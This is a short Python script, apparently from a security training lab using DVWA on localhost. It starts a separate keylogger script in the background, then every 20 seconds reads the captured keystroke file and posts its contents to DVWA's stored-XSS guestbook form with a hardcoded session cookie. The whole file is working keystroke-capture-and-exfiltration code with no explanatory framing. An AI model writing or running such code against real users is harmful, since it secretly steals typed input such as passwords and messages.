#!/usr/bin/env python3 

import requests 
import time 
import os 
from pynput.keyboard import Listener

startlog = time.time()

os.system("python3 /home/student/Desktop/scripts/keyloggerRemoteTest.py &") 
time.sleep(1)

def send_request():
	cookies = {'PHPSESSID':'kf0hsfv9d8ja33a2r3b2emc377', 'security':'impossible'}
	url='http://127.0.0.1/DVWA/vulnerabilities/xss_s/'
	form_input = open("/home/student/Desktop/scripts/keyboard_Input.txt")
	form_send = form_input.read()
	form_data = {'txtName':'Vader', 'mtxMessage':f"'{form_send}'", 'btnSign':'Sign+Guestbook'}
	r = requests.post(url, cookies=cookies, data=form_data)

def interval():
	global startlog 
	if time.time() - 20 > startlog: 
#		print('its been 20 secs') 
		send_request() 
		startlog = time.time()

counter = 0 
while True: 
	counter += 1 
#	print(counter) 
	interval() 
	time.sleep(1)

